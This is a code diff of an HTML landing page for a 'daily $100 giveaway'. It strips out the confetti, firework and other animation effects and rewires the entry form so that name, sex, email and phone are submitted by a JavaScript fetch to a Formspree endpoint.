@@ -15,7 +15,6 @@ body {
     background: linear-gradient(-45deg, #ff00cc, #ff8c00, #00f5ff, #ff0000);
     background-size: 600% 600%;
     animation: bgMove 6s ease infinite;
-    overflow: hidden;
 }
 
 @keyframes bgMove {
@@ -24,46 +23,12 @@ body {
     100% { background-position: 0% 50%; }
 }
 
-/* Confetti */
-.confetti {
-    position: fixed;
-    top: -10px;
-    width: 10px;
-    height: 10px;
-    animation: fall linear infinite;
-    opacity: 0.9;
-}
-
-@keyframes fall {
-    to {
-        transform: translateY(110vh) rotate(720deg);
-    }
-}
-
-/* Fireworks */
-.firework {
-    position: fixed;
-    width: 6px;
-    height: 6px;
-    border-radius: 50%;
-    background: white;
-    animation: explode 1s ease-out forwards;
-}
-
-@keyframes explode {
-    0% { transform: scale(1); opacity: 1; }
-    100% { transform: scale(20); opacity: 0; }
-}
-
-/* Layout */
 .wrapper {
     display: flex;
     justify-content: center;
     align-items: center;
     min-height: 100vh;
     padding: 20px;
-    position: relative;
-    z-index: 5;
 }
 
 .card {
@@ -73,30 +38,12 @@ body {
     width: 100%;
     max-width: 520px;
     text-align: center;
-    box-shadow: 0 0 40px #ff00cc, 0 0 80px #ff8c00;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.35);
     animation: bounceIn 0.7s ease;
-    border: 4px solid transparent;
-    background-clip: padding-box;
-    position: relative;
-}
-
-.card::before {
-    content: "";
-    position: absolute;
-    inset: -4px;
-    background: linear-gradient(45deg, #ff00cc, #ff8c00, #00f5ff, #ff0000);
-    z-index: -1;
-    border-radius: 30px;
-    animation: rotateBorder 4s linear infinite;
-}
-
-@keyframes rotateBorder {
-    0% { filter: hue-rotate(0deg); }
-    100% { filter: hue-rotate(360deg); }
 }
 
 @keyframes bounceIn {
-    0% { transform: scale(0.5); opacity: 0; }
+    0% { transform: scale(0.6); opacity: 0; }
     60% { transform: scale(1.1); }
     100% { transform: scale(1); opacity: 1; }
 }
@@ -109,26 +56,12 @@ body {
     font-size: 14px;
     font-weight: 600;
     margin-bottom: 25px;
-    animation: pulse 1.5s infinite;
-}
-
-@keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.08); }
-    100% { transform: scale(1); }
 }
 
 h1 {
-    font-size: 44px;
+    font-size: 38px;
     font-weight: 800;
     margin-bottom: 15px;
-    animation: wiggle 2s infinite;
-}
-
-@keyframes wiggle {
-    0%,100% { transform: rotate(0deg); }
-    25% { transform: rotate(-2deg); }
-    75% { transform: rotate(2deg); }
 }
 
 .sub {
@@ -143,6 +76,16 @@ input, select {
     border-radius: 12px;
     border: 2px solid #eee;
     font-size: 15px;
+    font-family: 'Poppins', sans-serif;
+}
+
+.row {
+    display: flex;
+    gap: 10px;
+}
+
+.row input {
+    flex: 1;
 }
 
 .phone-group {
@@ -174,25 +117,12 @@ button {
     font-size: 22px;
     font-weight: 800;
     cursor: pointer;
-    position: relative;
-    overflow: hidden;
+    transition: 0.3s;
 }
 
-button::after {
-    content: "";
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: rgba(255,255,255,0.4);
-    transform: skewX(-20deg);
-    animation: shine 2s infinite;
-}
-
-@keyframes shine {
-    0% { left: -100%; }
-    100% { left: 200%; }
+button:hover {
+    transform: scale(1.05);
+    box-shadow: 0 20px 40px rgba(255,0,128,0.4);
 }
 
 .trust {
@@ -205,42 +135,29 @@ button::after {
 
 <body>
 
-<script>
-// Confetti
-for (let i = 0; i < 80; i++) {
-    let confetti = document.createElement("div");
-    confetti.classList.add("confetti");
-    confetti.style.left = Math.random() * 100 + "vw";
-    confetti.style.background = ["#ff00cc","#ff8c00","#00f5ff","#ffffff"][Math.floor(Math.random()*4)];
-    confetti.style.animationDuration = (Math.random() * 2 + 2) + "s";
-    confetti.style.width = confetti.style.height = (Math.random() * 10 + 5) + "px";
-    document.body.appendChild(confetti);
-}
-
-// Fireworks every 3 seconds
-setInterval(() => {
-    let fw = document.createElement("div");
-    fw.classList.add("firework");
-    fw.style.left = Math.random() * 100 + "vw";
-    fw.style.top = Math.random() * 50 + "vh";
-    fw.style.background = ["#ff00cc","#ff8c00","#00f5ff","#ffffff"][Math.floor(Math.random()*4)];
-    document.body.appendChild(fw);
-    setTimeout(() => fw.remove(), 1000);
-}, 3000);
-</script>
-
 <div class="wrapper">
     <div class="card">
 
-        <div class="badge">🎉 DAILY BIRTHDAY PRIZES!! 🎉</div>
+        <div class="badge">🎉 DAILY $100 GIVEAWAY 🎉</div>
 
-        <h1>YOU COULD WIN BIG ON YOUR BIRTHDAY</h1>
-        <div class="sub">Enter your birthday. Get entered every single year.</div>
+        <h1>YOU COULD WIN BIG</h1>
+        <div class="sub">Enter your details and get automatically entered every year.</div>
 
-       <form action="https://formspree.io/f/xpqjgdww" method="POST">
-    <input type="hidden" name="_redirect" value="https://zeetools23.github.io/birthday-giveaway-landing/thankyou.html">
-    ...
-            <input type="text" name="name" placeholder="Full Name" required>
+        <form id="entryForm">
+
+            <div class="row">
+                <input type="text" name="first_name" placeholder="First Name" required>
+                <input type="text" name="surname" placeholder="Surname" required>
+            </div>
+
+            <select name="sex" required>
+                <option value="" disabled selected>Select Sex</option>
+                <option value="Male">Male</option>
+                <option value="Female">Female</option>
+                <option value="Other">Other</option>
+                <option value="Prefer not to say">Prefer not to say</option>
+            </select>
+
             <input type="email" name="email" placeholder="Email Address" required>
 
             <div class="phone-group">
@@ -269,6 +186,22 @@ setInterval(() => {
 
     </div>
 </div>
+
+<script>
+document.getElementById("entryForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(this);
+
+    await fetch("https://formspree.io/f/xpqjgdww", {
+        method: "POST",
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+    });
+
+    window.location.href = "thankyou.html";
+});
+</script>
 
 </body>
 </html>
